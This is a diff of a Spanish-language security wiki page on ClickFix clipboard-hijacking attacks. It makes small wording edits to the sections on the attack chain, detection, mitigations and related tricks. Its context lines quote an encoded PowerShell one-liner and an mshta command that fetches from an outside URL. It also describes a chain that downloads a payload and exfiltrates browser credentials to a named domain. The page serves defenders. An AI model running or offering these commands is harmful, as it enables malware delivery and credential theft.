@@ -55,7 +55,7 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-La llamada **mshta** lanza un script de PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` a través de `extrac32` y concatenación de archivos, y finalmente ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.
+La llamada **mshta** lanza un script de PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` a través de `extrac32` y concatenación de archivos y finalmente ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.
 
 ## Detección y Caza
 
@@ -68,14 +68,15 @@ Los equipos azules pueden combinar la telemetría del portapapeles, la creación
 
 ## Mitigaciones
 
-1. Endurecimiento del navegador – deshabilitar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir un gesto del usuario.
+1. Dureza del navegador – deshabilitar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir un gesto del usuario.
 2. Conciencia de seguridad – enseñar a los usuarios a *escribir* comandos sensibles o pegarlos primero en un editor de texto.
 3. Modo de Lenguaje Restringido de PowerShell / Política de Ejecución + Control de Aplicaciones para bloquear líneas de comandos arbitrarias.
 4. Controles de red – bloquear solicitudes salientes a dominios conocidos de pastejacking y C2 de malware.
 
 ## Trucos Relacionados
 
-* **Secuestro de Invitaciones de Discord** a menudo abusa del mismo enfoque ClickFix después de atraer a los usuarios a un servidor malicioso:
+* El **Secuestro de Invitaciones de Discord** a menudo abusa del mismo enfoque ClickFix después de atraer a los usuarios a un servidor malicioso:
+
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
